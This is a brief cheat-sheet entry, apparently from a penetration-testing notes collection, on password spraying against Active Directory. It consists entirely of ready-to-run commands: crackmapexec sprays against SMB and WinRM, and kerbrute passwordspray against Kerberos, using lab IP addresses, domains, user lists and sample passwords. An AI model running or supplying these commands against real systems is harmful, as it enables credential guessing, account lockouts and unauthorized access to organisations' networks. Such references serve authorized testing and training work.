---
title: AD Password Spraying
category: ad
subcategory: ad-attacks
os: linux
command: crackmapexec smb target -u users.txt -p 'Pass!' --continue-on-success
tools: crackmapexec, netexec, kerbrute
---


### SMB

```bash
crackmapexec smb 192.168.50.75 -u users.txt -p 'Nexus123!' -d corp.com --continue-on-success
crackmapexec smb 192.168.50.75 -u dave -p 'Flowers1' -d corp.com
crackmapexec smb 192.168.192.142 -u UserList.txt -p 'Password@123'
```

### WinRM

```bash
crackmapexec winrm 192.168.192.142 -u UserList.txt -p 'Password@123'
```

### Kerberos (kerbrute)

```bash
kerbrute passwordspray -d thecyborg.lab UserList Password@123 -dc 192.168.192.142
.\kerbrute_windows_amd64.exe passwordspray -d corp.com .\usernames.txt "Nexus123!"
```
